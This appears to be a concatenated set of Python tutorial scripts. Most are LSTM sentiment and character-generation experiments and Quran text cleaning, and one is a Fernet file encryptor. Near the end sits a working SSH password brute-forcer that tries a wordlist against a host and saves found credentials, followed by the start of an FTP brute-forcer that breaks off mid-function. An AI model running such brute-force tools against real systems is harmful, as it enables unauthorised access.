    embedding = tf.Variable(tf.random_uniform((n_words, embedding_size), -1, 1))
    # pass to the LSTM cells
    embed = tf.nn.embedding_lookup(embedding, inputs)

    # stackup multiple LSTM layers
    cell = tf.contrib.rnn.MultiRNNCell([get_lstm_cell() for i in range(lstm_layers)])

    initial_state = cell.zero_state(batch_size, tf.float32)

    # pass cell and input to cell, returns outputs for each time step
    # and the final state of the hidden layer
    # run the data through the rnn nodes
    outputs, final_state = tf.nn.dynamic_rnn(cell, embed, initial_state=initial_state)

    # grab the last output
    # use sigmoid for binary classification
    predictions = tf.contrib.layers.fully_connected(outputs[:, -1], 1, activation_fn=tf.sigmoid)

    # calculate cost using MSE
    cost = tf.losses.mean_squared_error(labels, predictions)
    optimizer = tf.train.AdamOptimizer(learning_rate).minimize(cost)

    # nodes to calculate the accuracy
    correct_pred = tf.equal(tf.cast(tf.round(predictions), tf.int32), labels)
    accuracy = tf.reduce_mean(tf.cast(correct_pred, tf.float32))

    saver = tf.train.Saver()

########### training ##########
epochs = 10

with tf.Session(graph=graph) as sess:
    sess.run(tf.global_variables_initializer())
    iteration = 1

    for e in range(epochs):
        state = sess.run(initial_state)

        for i, (x, y) in enumerate(get_batches(X_train, y_train, batch_size=batch_size)):
            y = np.array(y)
            x = np.array(x)
            feed = {inputs: x, labels: y[:, None],
                    keep_prob: 0.5,
                    initial_state: state}
            loss, state, _ = sess.run([cost, final_state, optimizer], feed_dict=feed)

            if iteration % 5 == 0:
                print(f"[Epoch: {e}/{epochs}] Iteration: {iteration} Train loss: {loss:.3f}")
            
            if iteration % 25 == 0:
                val_acc = []
                val_state = sess.run(cell.zero_state(batch_size, tf.float32))
                for x, y in get_batches(X_validation, y_validation, batch_size=batch_size):
                    x, y = np.array(x), np.array(y)
                    feed = {inputs: x, labels: y[:, None],
                            keep_prob: 1, initial_state: val_state}
                    batch_acc, val_state = sess.run([accuracy, final_state], feed_dict=feed)
                    val_acc.append(batch_acc)
                print(f"val_acc: {np.mean(val_acc):.3f}")

            iteration += 1

    saver.save(sess, "chechpoints/sentiment1.ckpt")

test_acc = []
with tf.Session(graph=graph) as sess:
    saver = tf.train.Saver()
    saver.restore(sess, tf.train.latest_checkpoint('checkpoints'))
    test_state = sess.run(cell.zero_state(batch_size, tf.float32))
    for ii, (x, y) in enumerate(get_batches(X_test, y_test, batch_size), 1):
        feed = {inputs: x,
                labels: y[:, None],
                keep_prob: 1,
                initial_state: test_state}
        batch_acc, test_state = sess.run([accuracy, final_state], feed_dict=feed)
        test_acc.append(batch_acc)
    print("Test accuracy: {:.3f}".format(np.mean(test_acc)))




def get_batches(x, y, batch_size=100):

    n_batches = len(x) // batch_size
    x, y = x[:n_batches*batch_size], y[:n_batches*batch_size]
    for i in range(0, len(x), batch_size):
        yield x[i: i+batch_size], y[i: i+batch_size]




import numpy as np
import pandas as pd
import tqdm
from string import punctuation

punc = set(punctuation)

df = pd.read_csv(r"E:\datasets\sentiment\food_reviews\amazon-fine-food-reviews\Reviews.csv")


X = np.zeros((len(df), 2), dtype=object)

for i in tqdm.tqdm(range(len(df)), "Cleaning X"):
    target = df['Text'].loc[i]

    # X.append(''.join([ c.lower() for c in target if c not in punc ]))
    X[i, 0] = ''.join([ c.lower() for c in target if c not in punc ])
    X[i, 1] = df['Score'].loc[i]


pd.DataFrame(X, columns=["Text", "Score"]).to_csv("data/Reviews.csv")




### Model Architecture hyper parameters
embedding_size = 64
# sequence_length = 500
sequence_length = 42
LSTM_units = 128

### Training parameters
batch_size = 128
epochs = 20

### Preprocessing parameters
# words that occur less than n times to be deleted from dataset
N = 10

# test size in ratio, train size is 1 - test_size
test_size = 0.15




from keras.models import Sequential
from keras.layers import Embedding, LSTM, Dense, Activation, LeakyReLU, Dropout, TimeDistributed
from keras.layers import SpatialDropout1D
from config import LSTM_units


def get_model_binary(vocab_size, sequence_length):
    embedding_size = 64
    model=Sequential()
    model.add(Embedding(vocab_size, embedding_size, input_length=sequence_length))
    model.add(SpatialDropout1D(0.15))
    model.add(LSTM(LSTM_units, recurrent_dropout=0.2))
    model.add(Dropout(0.3))
    model.add(Dense(1, activation='sigmoid'))
    model.summary()
    return model

def get_model_5stars(vocab_size, sequence_length, embedding_size, verbose=0):
    model=Sequential()
    model.add(Embedding(vocab_size, embedding_size, input_length=sequence_length))
    model.add(SpatialDropout1D(0.15))
    model.add(LSTM(LSTM_units, recurrent_dropout=0.2))
    model.add(Dropout(0.3))
    model.add(Dense(1, activation="linear"))
    if verbose:
        model.summary()
    return model




import numpy as np
import pandas as pd
import tqdm
import pickle
from collections import Counter
from sklearn.model_selection import train_test_split

from utils import clean_text, tokenize_words
from config import N, test_size

def load_review_data():
    # df = pd.read_csv("data/Reviews.csv")
    df = pd.read_csv(r"E:\datasets\sentiment\food_reviews\amazon-fine-food-reviews\Reviews.csv")
    # preview
    print(df.head())
    print(df.tail())
    vocab = []
    # X = np.zeros((len(df)*2, 2), dtype=object)
    X = np.zeros((len(df), 2), dtype=object)
    # for i in tqdm.tqdm(range(len(df)), "Cleaning X1"):
    #     target = df['Text'].loc[i]
    #     score = df['Score'].loc[i]
    #     X[i, 0] = clean_text(target)
    #     X[i, 1] = score
    #     for word in X[i, 0].split():
    #         vocab.append(word)

    # k = i+1
    k = 0

    for i in tqdm.tqdm(range(len(df)), "Cleaning X2"):
        target = df['Summary'].loc[i]
        score = df['Score'].loc[i]
        X[i+k, 0] = clean_text(target)
        X[i+k, 1] = score
        for word in X[i+k, 0].split():
            vocab.append(word)

    # vocab = set(vocab)
    vocab = Counter(vocab)

    # delete words that occur less than 10 times
    vocab = { k:v for k, v in vocab.items() if v >= N }

    # word to integer encoder dict
    vocab2int = {word: i for i, word in enumerate(vocab, start=1)}

    # pickle int2vocab for testing 
    print("Pickling vocab2int...")
    pickle.dump(vocab2int, open("data/vocab2int.pickle", "wb"))

    # encoded reviews
    for i in tqdm.tqdm(range(X.shape[0]), "Tokenizing words"):
        X[i, 0] = tokenize_words(str(X[i, 0]), vocab2int)

    lengths = [ len(row)  for row in X[:, 0] ]
    print("min_length:", min(lengths))
    print("max_length:", max(lengths))

    X_train, X_test, y_train, y_test = train_test_split(X[:, 0], X[:, 1], test_size=test_size, shuffle=True, random_state=19)

    return X_train, X_test, y_train, y_test, vocab




import os
# disable keras loggings
import sys
stderr = sys.stderr
sys.stderr = open(os.devnull, 'w')
import keras
sys.stderr = stderr
# to use CPU
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,

                        inter_op_parallelism_threads=5, 

                        allow_soft_placement=True,

                        device_count = {'CPU' : 1,

                                        'GPU' : 0}

                       )

from model import get_model_5stars
from utils import clean_text, tokenize_words
from config import embedding_size, sequence_length
from keras.preprocessing.sequence import pad_sequences

import pickle

vocab2int = pickle.load(open("data/vocab2int.pickle", "rb"))
model = get_model_5stars(len(vocab2int), sequence_length=sequence_length, embedding_size=embedding_size)

model.load_weights("results/model_V20_0.38_0.80.h5")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Food Review evaluator")
    parser.add_argument("review", type=str, help="The review of the product in text")
    args = parser.parse_args()

    review = tokenize_words(clean_text(args.review), vocab2int)
    x = pad_sequences([review], maxlen=sequence_length)

    print(f"{model.predict(x)[0][0]:.2f}/5")




# to use CPU
# import os
# os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
# os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

# import tensorflow as tf

# config = tf.ConfigProto(intra_op_parallelism_threads=5,
#                         inter_op_parallelism_threads=5, 
#                         allow_soft_placement=True,
#                         device_count = {'CPU' : 1,
#                                         'GPU' : 0}
                    #    )

import os
import numpy as np
import pandas as pd
from keras.callbacks import ModelCheckpoint
from keras.preprocessing import sequence

from preprocess import load_review_data
from model import get_model_5stars
from config import sequence_length, embedding_size, batch_size, epochs

X_train, X_test, y_train, y_test, vocab = load_review_data()

vocab_size = len(vocab)

print("Vocab size:", vocab_size)

X_train = sequence.pad_sequences(X_train, maxlen=sequence_length)
X_test = sequence.pad_sequences(X_test, maxlen=sequence_length)

print("X_train.shape:", X_train.shape)
print("X_test.shape:", X_test.shape)

print("y_train.shape:", y_train.shape)
print("y_test.shape:", y_test.shape)

model = get_model_5stars(vocab_size, sequence_length=sequence_length, embedding_size=embedding_size)
model.load_weights("results/model_V40_0.60_0.67.h5")
model.compile(loss="mse", optimizer="adam", metrics=["accuracy"])

if not os.path.isdir("results"):
    os.mkdir("results")

checkpointer = ModelCheckpoint("results/model_V40_{val_loss:.2f}_{val_acc:.2f}.h5", save_best_only=True, verbose=1)

model.fit(X_train, y_train, epochs=epochs,
          validation_data=(X_test, y_test),
          batch_size=batch_size,
          callbacks=[checkpointer])




import numpy as np
from string import punctuation

# make it a set to accelerate tests
punc = set(punctuation)

def clean_text(text):
    return ''.join([ c.lower() for c in str(text) if c not in punc ])

def tokenize_words(words, vocab2int):
    words = words.split()
    tokenized_words = np.zeros((len(words),))
    for j in range(len(words)):
        try:
            tokenized_words[j] = vocab2int[words[j]]
        except KeyError:
            # didn't add any unk, just ignore
            pass
    return tokenized_words




import numpy as np
import pickle
import tqdm
from keras.models import Sequential
from keras.layers import Dense, LSTM, Dropout, Activation
from keras.callbacks import ModelCheckpoint

seed = "import os"
# output:
# ded of and alice as it go on and the court
# well you wont you wouldncopy thing
# there was not a long to growing anxiously any only a low every cant
# go on a litter which was proves of any only here and the things and the mort meding and the mort and alice was the things said to herself i cant remeran as if i can repeat eften to alice any of great offf its archive of and alice and a cancur as the mo

char2int = pickle.load(open("python-char2int.pickle", "rb"))
int2char = pickle.load(open("python-int2char.pickle", "rb"))

sequence_length = 100
n_unique_chars = len(char2int)

# building the model
model = Sequential([
    LSTM(256, input_shape=(sequence_length, n_unique_chars), return_sequences=True),
    Dropout(0.3),
    LSTM(256),
    Dense(n_unique_chars, activation="softmax"),
])

model.load_weights("results/python-v2-2.48.h5")

# generate 400 characters
generated = ""
for i in tqdm.tqdm(range(400), "Generating text"):
    # make the input sequence
    X = np.zeros((1, sequence_length, n_unique_chars))
    for t, char in enumerate(seed):
        X[0, (sequence_length - len(seed)) + t, char2int[char]] = 1
    # predict the next character
    predicted = model.predict(X, verbose=0)[0]
    # converting the vector to an integer
    next_index = np.argmax(predicted)
    # converting the integer to a character
    next_char = int2char[next_index]
    # add the character to results
    generated += next_char
    # shift seed and the predicted character
    seed = seed[1:] + next_char

print("Generated text:")
print(generated)




import numpy as np
import os
import pickle
from keras.models import Sequential
from keras.layers import Dense, LSTM, Dropout
from keras.callbacks import ModelCheckpoint

from utils import get_batches

# import requests
# content = requests.get("http://www.gutenberg.org/cache/epub/11/pg11.txt").text
# open("data/wonderland.txt", "w", encoding="utf-8").write(content)

from string import punctuation
# read the data
# text = open("data/wonderland.txt", encoding="utf-8").read()
text = open("E:\\datasets\\text\\my_python_code.py").read()
# remove caps
text = text.lower()
for c in "!":
    text = text.replace(c, "")
# text = text.lower().replace("\n\n", "\n").replace("", "").replace("", "").replace("", "").replace("", "")
# text = text.translate(str.maketrans("", "", punctuation))
# text = text[:100_000]
n_chars = len(text)
unique_chars = ''.join(sorted(set(text)))
print("unique_chars:", unique_chars)
n_unique_chars = len(unique_chars)
print("Number of characters:", n_chars)
print("Number of unique characters:", n_unique_chars)

# dictionary that converts characters to integers
char2int = {c: i for i, c in enumerate(unique_chars)}
# dictionary that converts integers to characters
int2char = {i: c for i, c in enumerate(unique_chars)}

# save these dictionaries for later generation
pickle.dump(char2int, open("python-char2int.pickle", "wb"))
pickle.dump(int2char, open("python-int2char.pickle", "wb"))

# hyper parameters
sequence_length = 100
step = 1
batch_size = 128
epochs = 1

sentences = []
y_train = []
for i in range(0, len(text) - sequence_length, step):
    sentences.append(text[i: i + sequence_length])
    y_train.append(text[i+sequence_length])
print("Number of sentences:", len(sentences))

X = get_batches(sentences, y_train, char2int, batch_size, sequence_length, n_unique_chars, n_steps=step)

# for i, x in enumerate(X):
#     if i == 1:
#         break
#     print(x[0].shape, x[1].shape)

# # vectorization
# X = np.zeros((len(sentences), sequence_length, n_unique_chars))
# y = np.zeros((len(sentences), n_unique_chars))

# for i, sentence in enumerate(sentences):
#     for t, char in enumerate(sentence):
#         X[i, t, char2int[char]] = 1
#         y[i, char2int[y_train[i]]] = 1
# X = np.array([char2int[c] for c in text])

# print("X.shape:", X.shape)
# goal of X is (n_samples, sequence_length, n_chars)
# sentences = np.zeros(())


# print("y.shape:", y.shape)
# building the model
# model = Sequential([
#     LSTM(128, input_shape=(sequence_length, n_unique_chars)),
#     Dense(n_unique_chars, activation="softmax"),
# ])
# building the model
model = Sequential([
    LSTM(256, input_shape=(sequence_length, n_unique_chars), return_sequences=True),
    Dropout(0.3),
    LSTM(256),
    Dense(n_unique_chars, activation="softmax"),
])

model.load_weights("results/python-v2-2.48.h5")

model.summary()
model.compile(loss="categorical_crossentropy", optimizer="adam", metrics=["accuracy"])

if not os.path.isdir("results"):
    os.mkdir("results")

checkpoint = ModelCheckpoint("results/python-v2-{loss:.2f}.h5", verbose=1)

# model.fit(X, y, batch_size=batch_size, epochs=epochs, callbacks=[checkpoint])
model.fit_generator(X, steps_per_epoch=len(sentences) // batch_size, epochs=epochs, callbacks=[checkpoint])




import numpy as np

def get_batches(sentences, y_train, char2int, batch_size, sequence_length, n_unique_chars, n_steps):

    chars_per_batch = batch_size * n_steps
    n_batches = len(sentences) // chars_per_batch
    while True:
        for i in range(0, len(sentences), batch_size):

            X = np.zeros((batch_size, sequence_length, n_unique_chars))
            y = np.zeros((batch_size, n_unique_chars))

            for i, sentence in enumerate(sentences[i: i+batch_size]):
                for t, char in enumerate(sentence):
                    X[i, t, char2int[char]] = 1
                    y[i, char2int[y_train[i]]] = 1

            yield X, y




from pyarabic.araby import ALPHABETIC_ORDER

with open("quran.txt", encoding="utf8") as f:
    text = f.read()

unique_chars = set(text)
print("unique chars:", unique_chars)
arabic_alpha = { c for c, order in ALPHABETIC_ORDER.items() }
to_be_removed = unique_chars - arabic_alpha
to_be_removed = to_be_removed - {'.', ' ', ''}
print(to_be_removed)
text = text.replace("", ".")
for char in to_be_removed:
    text = text.replace(char, "")
text = text.replace("  ", " ")
text = text.replace(" \n", "")
text = text.replace("\n ", "")
with open("quran_cleaned.txt", "w", encoding="utf8") as f:
    print(text, file=f)




from sklearn.model_selection import GridSearchCV
from keras.wrappers.scikit_learn import KerasClassifier
from utils import read_data, text_to_sequence, get_batches, get_data
from models import rnn_model
from keras.layers import LSTM

import numpy as np

text, int2char, char2int = read_data()

batch_size = 256
test_size = 0.2

n_steps = 200
n_chars = len(text)
vocab_size = len(set(text))
print("n_steps:", n_steps)
print("n_chars:", n_chars)
print("vocab_size:", vocab_size)
encoded = np.array(text_to_sequence(text))
n_train = int(n_chars * (1-test_size))
X_train = encoded[:n_train]
X_test = encoded[n_train:]

X, Y = get_data(X_train, batch_size, n_steps, vocab_size=vocab_size+1)

print(X.shape)
print(Y.shape)

# cell, num_layers, units, dropout, output_dim, batch_normalization=True, bidirectional=True
model = KerasClassifier(build_fn=rnn_model, input_dim=n_steps, cell=LSTM, num_layers=2, dropout=0.2, output_dim=vocab_size+1,
                        batch_normalization=True, bidirectional=True)



params = {
    "units": [100, 128, 200, 256, 300]
}

grid = GridSearchCV(estimator=model, param_grid=params)
grid_result = grid.fit(X, Y)
print(grid_result.best_estimator_)
print(grid_result.best_params_)
print(grid_result.best_score_)




from keras.models import Sequential
from keras.layers import LSTM, Dropout, BatchNormalization, LeakyReLU, Dense, Activation, TimeDistributed, Bidirectional

def rnn_model(input_dim, cell, num_layers, units, dropout, output_dim, batch_normalization=True, bidirectional=True):
    model = Sequential()
    for i in range(num_layers):
        if i == 0:
            # first time, specify input_shape
            # if bidirectional:
            #     model.add(Bidirectional(cell(units, input_shape=(None, input_dim), return_sequences=True)))
            # else:
            model.add(cell(units, input_shape=(None, input_dim), return_sequences=True))
            if batch_normalization:
                model.add(BatchNormalization())
            model.add(Dropout(dropout))
            model.add(LeakyReLU(alpha=0.1))
        else:
            if i == num_layers - 1:
                return_sequences = False
            else:
                return_sequences = True
            if bidirectional:
                model.add(Bidirectional(cell(units, return_sequences=return_sequences)))
            else:
                model.add(cell(units, return_sequences=return_sequences))
            if batch_normalization:
                model.add(BatchNormalization())
            model.add(Dropout(dropout))
            model.add(LeakyReLU(alpha=0.1))

    model.add(Dense(output_dim, activation="softmax"))

    model.compile(loss="categorical_crossentropy", optimizer="nadam", metrics=["accuracy"])
    return model




# to use CPU
import os
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )
from models import rnn_model
from keras.layers import LSTM
from utils import sequence_to_text, get_data

import numpy as np
import pickle

char2int = pickle.load(open("results/char2int.pickle", "rb"))
int2char = { v:k for k, v in char2int.items() }
print(int2char)
n_steps = 500

def text_to_sequence(text):
    global char2int
    return [ char2int[c] for c in text ]

def pick_top_n(preds, vocab_size, top_n=5):
    p = np.squeeze(preds)
    p[np.argsort(p)[:-top_n]] = 0
    p = p / np.sum(p)
    c = np.random.choice(vocab_size, 1, p=p)[0]
    return c

def logits_to_text(logits):
    """
    Turn logits from a neural network into text using the tokenizer
    :param logits: Logits from a neural network
    :param tokenizer: Keras Tokenizer fit on the labels
    :return: String that represents the text of the logits
    """
    return int2char[np.argmax(logits, axis=0)]
    # return ''.join([int2char[prediction] for prediction in np.argmax(logits, 1)])

def generate_code(model, initial_text, n_chars=100):
    new_chars = ""
    for i in range(n_chars):
        x = np.array(text_to_sequence(initial_text))
        x, _ = get_data(x, 64, n_steps, 1)
        pred = model.predict(x)[0][0]
        c = logits_to_text(pred)
        new_chars += c
        initial_text += c
    return new_chars


model = rnn_model(input_dim=n_steps, output_dim=99, cell=LSTM, num_layers=3, units=200, dropout=0.2, batch_normalization=True)

model.load_weights("results/rnn_3.5")
x = """x = np.array(text_to_sequence(x))
x, _ = get_data(x, n_steps, 1)
print(x.shape)
print(x.shape)
print(model.predict_proba(x))
print(model.predict_classes(x))

def pick_top_n(preds, vocab_size, top_n=5):
    p = np.squeeze(preds)
    p[np.argsort(p)[:-top_n]] = 0
    p = p / np.sum(p)
    c = np.random.choice(vocab_size, 1, p=p)[0]
    return c
    
def sample(checkpoint, n_samples, lstm_size, vocab_size, prime="The"):
    samples = [c for c in prime]
    
    with train_chars.tf.Session() as sess:
        saver.restore(sess, checkpoint)
        new_state = sess.run(model.initial_state)
        for c in prime:
            x = np.zeros((1, 1))
            x[0,0] = train_chars.char2int[c]
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)
        # print("Preds:", preds)
        c = pick_top_n(preds, len(train_chars.vocab))
        samples.append(train_chars.int2char[c])

        for i in range(n_samples):
            x[0,0] = c
            feed = {model.inputs: x,
                    model.keep_prob: 1.,
                    model.initial_state: new_state}
            preds, new_state = sess.run([model.prediction, model.final_state], 
                                         feed_dict=feed)

            c = pick_top_n(preds, len(train_chars.vocab))
            char = train_chars.int2char[c]
            samples.append(char)
        #     if i == n_samples - 1 and char != " " and char != ".":
            if i == n_samples - 1 and char != " ":
                # while char != "." and char != " ":
                while char != " ":
                    x[0,0] = c
                    feed = {model.inputs: x,
                            model.keep_prob: 1.,
                            model.initial_state: new_state}
                    preds, new_state = sess.run([model.prediction, model.final_state], 
                                                feed_dict=feed)

                    c = pick_top_n(preds, len(train_chars.vocab))
                    char = train_chars.int2char[c]
                    samples.append(cha
"""

# print(x.shape)
# print(x.shape)
# pred = model.predict(x)[0][0]
# print(pred)
# print(logits_to_text(pred))
# print(model.predict_classes(x))
print(generate_code(model, x, n_chars=500))




from models import rnn_model
from keras.layers import LSTM
from keras.callbacks import ModelCheckpoint
from utils import text_to_sequence, sequence_to_text, get_batches, read_data, get_data, get_data_length

import numpy as np
import os

text, int2char, char2int = read_data(load=False)

batch_size = 256
test_size = 0.2

n_steps = 500
n_chars = len(text)
vocab_size = len(set(text))
print("n_steps:", n_steps)
print("n_chars:", n_chars)
print("vocab_size:", vocab_size)
encoded = np.array(text_to_sequence(text))
n_train = int(n_chars * (1-test_size))
X_train = encoded[:n_train]
X_test = encoded[n_train:]

train = get_batches(X_train, batch_size, n_steps, output_format="many", vocab_size=vocab_size+1)
test = get_batches(X_test, batch_size, n_steps, output_format="many", vocab_size=vocab_size+1)

for i, t in enumerate(train):
    if i == 2:
        break
print(t[0])
print(np.array(t[0]).shape)
# print(test.shape)

# # DIM = 28

# model = rnn_model(input_dim=n_steps, output_dim=vocab_size+1, cell=LSTM, num_layers=3, units=200, dropout=0.2, batch_normalization=True)
# model.summary()

# model.compile(loss="categorical_crossentropy", optimizer="nadam", metrics=["accuracy"])

# if not os.path.isdir("results"):
#     os.mkdir("results")

# checkpointer = ModelCheckpoint("results/rnn_{val_loss:.1f}", save_best_only=True, verbose=1)

# train_steps_per_epoch = get_data_length(X_train, n_steps, output_format="one") // batch_size
# test_steps_per_epoch = get_data_length(X_test, n_steps, output_format="one") // batch_size

# print("train_steps_per_epoch:", train_steps_per_epoch)
# print("test_steps_per_epoch:", test_steps_per_epoch)

# model.load_weights("results/rnn_3.2")

# model.fit_generator(train,
#           epochs=30,
#           validation_data=(test),
#           steps_per_epoch=train_steps_per_epoch,
#           validation_steps=test_steps_per_epoch,
#           callbacks=[checkpointer],
#           verbose=1)

# model.save("results/rnn_final.model")




import numpy as np
import tqdm
import pickle
from keras.utils import to_categorical

int2char, char2int = None, None

def read_data(load=False):
    global int2char
    global char2int

    with open("E:\\datasets\\text\\my_python_code.py") as f:
        text = f.read()

    unique_chars = set(text)
    if not load:
        int2char = { i: c for i, c in enumerate(unique_chars, start=1) }
        char2int = { c: i for i, c in enumerate(unique_chars, start=1) }
        pickle.dump(int2char, open("results/int2char.pickle", "wb"))
        pickle.dump(char2int, open("results/char2int.pickle", "wb"))
    else:
        int2char = pickle.load(open("results/int2char.pickle", "rb"))
        char2int = pickle.load(open("results/char2int.pickle", "rb"))
    return text, int2char, char2int


def get_batches(arr, batch_size, n_steps, vocab_size, output_format="many"):
    '''Create a generator that returns batches of size
       batch_size x n_steps from arr.
       
       Arguments
       ---------
       arr: Array you want to make batches from
       batch_size: Batch size, the number of sequences per batch
       n_steps: Number of sequence steps per batch
    '''
    chars_per_batch = batch_size * n_steps
    n_batches = len(arr) // chars_per_batch

    arr = arr[:chars_per_batch * n_batches]

    arr = arr.reshape((batch_size, -1))
    if output_format == "many":
        while True:
            for n in range(0, arr.shape[1], n_steps):
                x = arr[:, n: n+n_steps]
                y_temp = arr[:, n+1:n+n_steps+1]
                y = np.zeros(x.shape, dtype=y_temp.dtype)
                y[:, :y_temp.shape[1]] = y_temp
                yield x.reshape(1, x.shape[0], x.shape[1]), y.reshape(1, y.shape[0], y.shape[1])
    elif output_format == "one":
        while True:
            # X = np.zeros((arr.shape[1], n_steps))
            # y = np.zeros((arr.shape[1], 1))
            # for i in range(n_samples-n_steps):
            #     X[i] = np.array([ p.replace(",", "") if isinstance(p, str) else p for p in df.Price.iloc[i: i+n_steps] ])
            #     price = df.Price.iloc[i + n_steps]
            #     y[i] = price.replace(",", "") if isinstance(price, str) else price
            for n in range(arr.shape[1] - n_steps-1):
                x = arr[:, n: n+n_steps]
                y = arr[:, n+n_steps+1]
                # print("y.shape:", y.shape)
                y = to_categorical(y, num_classes=vocab_size)
                # print("y.shape after categorical:", y.shape)
                y = np.expand_dims(y, axis=0)
                yield x.reshape(1, x.shape[0], x.shape[1]), y


def get_data(arr, batch_size, n_steps, vocab_size):

    # n_samples = len(arr) // n_seq
    # X = np.zeros((n_seq, n_samples))
    # Y = np.zeros((n_seq, n_samples))
    chars_per_batch = batch_size * n_steps
    n_batches = len(arr) // chars_per_batch

    arr = arr[:chars_per_batch * n_batches]

    arr = arr.reshape((batch_size, -1))

    # for index, i in enumerate(range(0, n_samples*n_seq, n_seq)):
    #     x = arr[i:i+n_seq]
    #     y = arr[i+1:i+n_seq+1]
    #     if len(x) != n_seq or len(y) != n_seq:
    #         break
    #     X[:, index] = x
    #     Y[:, index] = y
    X = np.zeros((batch_size, arr.shape[1]))
    Y = np.zeros((batch_size, vocab_size))
    for n in range(arr.shape[1] - n_steps-1):
        x = arr[:, n: n+n_steps]
        y = arr[:, n+n_steps+1]
        # print("y.shape:", y.shape)
        y = to_categorical(y, num_classes=vocab_size)
        # print("y.shape after categorical:", y.shape)
        # y = np.expand_dims(y, axis=1)
        X[:, n: n+n_steps] = x
        Y[n] = y
        # yield x.reshape(1, x.shape[0], x.shape[1]), y
    return np.expand_dims(X, axis=1), Y
        
    # return n_samples
    # return X.T.reshape(1, X.shape[1], X.shape[0]), Y.T.reshape(1, Y.shape[1], Y.shape[0])

def get_data_length(arr, n_seq, output_format="many"):
    if output_format == "many":
        return len(arr) // n_seq
    elif output_format == "one":
        return len(arr) - n_seq


def text_to_sequence(text):
    global char2int
    return [ char2int[c] for c in text ]

def sequence_to_text(sequence):
    global int2char
    return ''.join([ int2char[i] for i in sequence ])




import json
import os
import glob

CUR_DIR = os.getcwd()
text = ""

# for filename in os.listdir(os.path.join(CUR_DIR, "data", "json")):
surat = [ f"surah_{i}.json" for i in range(1, 115) ]
for filename in surat:
    filename = os.path.join(CUR_DIR, "data", "json", filename)
    file = json.load(open(filename, encoding="utf8"))
    content = file['verse']
    for verse_id, ayah in content.items():
        text += f"{ayah}."
            
n_ayah = len(text.split("."))
n_words = len(text.split(" "))
n_chars = len(text)

print(f"Number of ayat: {n_ayah}, Number of words: {n_words}, Number of chars: {n_chars}")

with open("quran.txt", "w", encoding="utf8") as quran_file:
    print(text, file=quran_file)




import paramiko
import socket
import time
from colorama import init, Fore

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE


def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    # read the file
    passlist = open(passlist).read().splitlines()
    # brute-force
    for password in passlist:
        if is_ssh_open(host, user, password):
            # if combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{user}{host}:{password}")
            break




from cryptography.fernet import Fernet
import os


def write_key():
    """
    Generates a key and save it into a file
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    """
    Loads the key from the current directory named key.key
    """
    return open("key.key", "rb").read()


def encrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and write it
    """
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)


def decrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it decrypts the file and write it
    """
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    decrypted_data = f.decrypt(encrypted_data)
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Simple File Encryptor Script")
    parser.add_argument("file", help="File to encrypt/decrypt")
    parser.add_argument("-g", "--generate-key", dest="generate_key", action="store_true",
                        help="Whether to generate a new key or use existing")
    parser.add_argument("-e", "--encrypt", action="store_true",
                        help="Whether to encrypt the file, only -e or -d can be specified.")
    parser.add_argument("-d", "--decrypt", action="store_true",
                        help="Whether to decrypt the file, only -e or -d can be specified.")

    args = parser.parse_args()
    file = args.file
    generate_key = args.generate_key

    if generate_key:
        write_key()
    # load the key
    key = load_key()

    encrypt_ = args.encrypt
    decrypt_ = args.decrypt

    if encrypt_ and decrypt_:
        raise TypeError("Please specify whether you want to encrypt the file or decrypt it.")
    elif encrypt_:
        encrypt(file, key)
    elif decrypt_:
        decrypt(file, key)
    else:
        raise TypeError("Please specify whether you want to encrypt the file or decrypt it.")




import ftplib
from threading import Thread
import queue
from colorama import Fore, init # for fancy colors, nothing else

# init the console for colors (for Windows)
# init()
# initialize the queue
q = queue.Queue()

# port of FTP, aka 21
port = 21

def connect_ftp():
    global q
    while True:
